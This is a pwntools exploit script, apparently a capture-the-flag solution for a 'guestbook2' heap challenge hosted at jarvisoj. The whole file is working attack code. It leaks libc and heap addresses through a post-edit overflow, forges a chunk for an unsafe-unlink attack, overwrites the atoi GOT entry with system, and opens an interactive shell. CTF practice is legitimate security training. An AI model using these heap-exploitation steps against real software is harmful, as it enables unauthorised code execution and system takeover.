#! /usr/bin/python

from pwn import *

p = process('./guestbook2')
#p = remote('pwn.jarvisoj.com',9879)
elf = ELF('./guestbook2')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
context.log_level = 'debug'



def show():
    p.recvuntil('Your choice: ')
    p.sendline('1')

def new(note):
    p.recvuntil('Your choice: ')
    p.sendline('2')
    p.recvuntil('Length of new post: ')
    p.sendline(str(len(note)))
    p.recvuntil('Enter your post: ')
    p.sendline(note)

def edit(index,note):
    p.recvuntil('Your choice: ')
    p.sendline('3')
    p.recvuntil('Post number: ')
    p.sendline(str(index))
    p.recvuntil('Length of post: ')
    p.sendline(str(len(note)))
    p.recvuntil('Enter your post: ')
    p.sendline(note)

def delete(index):
    p.recvuntil('Your choice: ')
    p.sendline('4')
    p.recvuntil('Post number: ')
    p.sendline(str(index))

main_arena_offset = 0x3c4b20

###leak heap&&libc###
new('a'*0x80)#0
new('b'*0x80)#1
new('c'*0x80)#2
new('d'*0x80)#2
new('e'*0x80)#4 gap to top

delete(1)
delete(3)

payload = 'a' * 0x80 + 'b' * 0x10
edit(0,payload) 
show()
p.recvuntil('b'*0x10)
libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 88 - main_arena_offset

payload = 'a' * 0x80 + 'b' * 0x18
edit(0,payload)
show()
p.recvuntil('b'*0x18)
heap_base = u64(p.recv(4).ljust(8,'\x00')) - 0x19d0

log.success('libc base:'+hex(libc_base))
log.success('heap base:'+hex(heap_base))

###unlink###
fake_chunk = heap_base + 0x30
fake_FD = fake_chunk - 0x18
fake_BK = fake_chunk - 0x10

payload = p64(0x90) + p64(0x80) + p64(fake_FD) + p64(fake_BK)
payload = payload.ljust(0x80,'\x00')
payload+= p64(0x80) + p64(0x90)
payload = payload.ljust(0x80*2,'\x00')

edit(0,payload)
delete(1)

###hijack GOT###
libc.address = libc_base
system = libc.symbols['system']
atoi_got = elf.got['atoi']

payload = p64(2) + p64(1) + p64(0x100) + p64(fake_FD) + p64(1) +p64(0x8) +p64(atoi_got)
payload = payload.ljust(0x80*2,'\x00')
edit(0,payload)

edit(1,p64(system))

###get shell###
p.sendline('$0;')
p.interactive()
